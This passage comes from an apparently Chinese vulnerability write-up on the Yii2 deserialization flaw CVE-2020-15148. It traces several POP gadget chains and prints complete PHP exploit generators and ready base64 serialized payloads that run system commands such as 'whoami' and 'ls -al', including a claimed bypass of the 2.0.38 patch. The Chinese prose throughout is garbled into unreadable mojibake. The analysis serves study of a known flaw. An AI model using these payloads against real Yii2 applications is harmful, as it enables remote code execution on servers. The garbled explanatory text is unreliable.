<span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å‘½ä»¤æ‰§è¡Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511204922226.png" alt loading="lazy"></p><h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>è¿˜æ˜¯ä»<code>yii2/db/BatchQueryResult.php</code>å…¥æ‰‹ï¼Œæ¢ç§æ€è·¯ï¼Œæˆ‘ä»¬ä¸æ‰¾<code>__call</code>æ–¹æ³•æ¥è§¦å‘ï¼Œç›´æ¥æ‰¾<code>close</code>æ–¹æ³•</p><p>éšåæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ª<code>FnStream.php</code>åœ¨<code>vendor\guzzlehttp\psr7\src</code>ç›®å½•ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;_fn_close</code>å¯æ§</p><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjk6Il9mbl9jbG9zZSI7czo3OiJwaHBpbmZvIjt9fQ==</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513172934351.png" alt loading="lazy"></p><p>æˆ‘ä»¬éœ€è¦å¯¹å±å®³è¿›è¡Œæ”¾å¤§ï¼Œè¿™é‡Œå°±éœ€è¦ä¸€ä¸ªæ‰§è¡Œç±»ï¼Œæ‹¿è¿™ä¸ª<code>call_user_func</code>å‡½æ•°ä½œè·³æ¿ï¼Œæ¥è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå…¨å±€æœç´¢evalï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>MockTrait.php</code>æ–‡ä»¶åœ¨<code>vendor\phpunit\phpunit\src\Framework\MockObject</code>ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function"><span class="token punctuation">\</span>class_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">classCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;classCode</code>å’Œ<code>$this-&gt;mockName</code>éƒ½å¯æ§</p><p>äºæ˜¯å³å¯æ„é€ å®Œæ•´çš„<code>pop</code>é“¾</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">call_user_func</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token operator">::</span><span class="token constant">generate</span><span class="token operator">-></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockTrait</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$classCode</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$mockName</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"extrader"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token keyword">new</span> <span class="token class-name">MockTrait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'generate'</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ç„¶è€Œä»£ç å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œçœ‹åˆ°æŠ¥é”™ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513175847226.png" alt loading="lazy"></p><p><code>__wakeup</code>æ–¹æ³•<code>throw</code>å‡ºå»äº†ï¼Œå½“ç„¶<code>__wakeup</code>å¯ç»•ï¼Œå‰ææ˜¯PHP5 &lt; 5.6.25ï¼Œ7.x &lt; 7.0.10ä¹‹å‰ï¼Œå…·ä½“ç»•è¿‡æ–¹æ³•ç½‘ä¸Šå¾ˆå¤šï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæ‰§è¡Œæ•ˆæœå¦‚ä¸‹</p><p>paylaod:</p><pre class="language-none"><code class="language-none">TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjk6Il9mbl9jbG9zZSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQiOjI6e3M6NDk6IgBQSFBVbml0XEZyYW1ld29ya1xNb2NrT2JqZWN0XE1vY2tUcmFpdABjbGFzc0NvZGUiO3M6MTc6InN5c3RlbSgnd2hvYW1pJyk7IjtzOjQ4OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQAbW9ja05hbWUiO3M6ODoiZXh0cmFkZXIiO31pOjE7czo4OiJnZW5lcmF0ZSI7fX19</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513182520433.png" alt loading="lazy"></p><p>è¿™é‡Œå°±ç–‘æƒ‘äº†ï¼Œæˆ‘è¿™é‡Œphpæ˜æ˜æ˜¯php7.4çš„ç¯å¢ƒï¼Œä¸ºä»€ä¹ˆä¹Ÿå¯ä»¥ç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>æ—¢ç„¶<code>__wakeup</code>å¯ç»•ï¼Œé‚£<code>2.0.38</code>ç‰ˆæœ¬ä¿®å¤çš„æ–¹æ³•å°±æ˜¯åŠ ä¸€ä¸ª<code>__wakeup</code>æ–¹æ³•ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥ç›´æ¥ç»•ï¼Ÿåœ¨githubä¸ŠåˆæŠŠ<code>2.0.38</code>ç‰ˆæœ¬çš„æºç ä¸‹ä¸‹æ¥ï¼Œç„¶åç”¨æ„é€ å¥½çš„ç»•è¿‡<code>__wakeup</code>çš„payloadæµ‹è¯•ï¼Œç›´æ¥æ²¡å›æ˜¾äº†ï¼ŒæŠ¥é”™ä¹Ÿæ²¡äº†ï¼Œæœ‰ç‚¹è¿·ï¼Œæœ‰ç‚¹è¿·ã€‚ã€‚ã€‚</p><h3 id="2-0-38ååºåˆ—åŒ–"><a href="#2-0-38ååºåˆ—åŒ–" class="headerlink" title="2.0.38ååºåˆ—åŒ–"></a>2.0.38ååºåˆ—åŒ–</h3><p>æ­¤å¤„å‚è€ƒ<a href="https://v0w.top/2020/09/22/Yii2unserialize/#0x03-%E6%96%B0%E7%89%88%E6%9C%AC2-0-38%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">é“¾æ¥</a>ï¼Œå¸ˆå‚…å¾ˆå¼ºï¼Œå­¦ä¹ äº†ï¼</p><h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>åˆ©ç”¨ç‚¹åœ¨<code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p><p>é‡Œé¢æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/** @var $process Process  **/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">-></span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[RunProcess] Stopping '</span> <span class="token operator">.</span> <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯¹è±¡åœ¨é”€æ¯çš„æ—¶å€™ï¼Œè§¦å‘<code>__destruct</code>æ–¹æ³•ï¼Œ<code>__destruct</code>æ–¹æ³•è°ƒç”¨äº†<code>stopProcess</code>æ–¹æ³•ï¼Œ<code>stopProcess</code>æ–¹æ³•ä¸­çš„<code>$this-&gt;processes</code>å¯æ§ï¼Œå³<code>$process</code>ä¹Ÿå¯æ§ï¼Œ<code>$process</code>ä¼šè°ƒç”¨<code>isRunning()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å°è¯•åˆ©ç”¨<code>__call</code>æ–¹æ³•äº†ï¼Œå¯ä»¥æ¥ç€ä¸Šé¢çš„<code>POP1</code>é“¾åˆ©ç”¨</p><p>å®Œæ•´çš„<code>pop</code>é“¾å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP3: RunProcess -> ... -> __call()</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls -al'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//stopProcessæ–¹æ³•é‡Œåˆè°ƒç”¨äº†isRunning()æ–¹æ³•: $process->isRunning()</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¯·æ±‚ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513193606816.png" alt loading="lazy"></p><h4 id="POP4"><a href="#POP4" class="headerlink" title="POP4"></a>POP4</h4><p>åˆ©ç”¨ç‚¹åœ¨<code>vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>ä¸­</p><p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token keyword">as</span> <span class="token variable">$nsKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$itemKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token 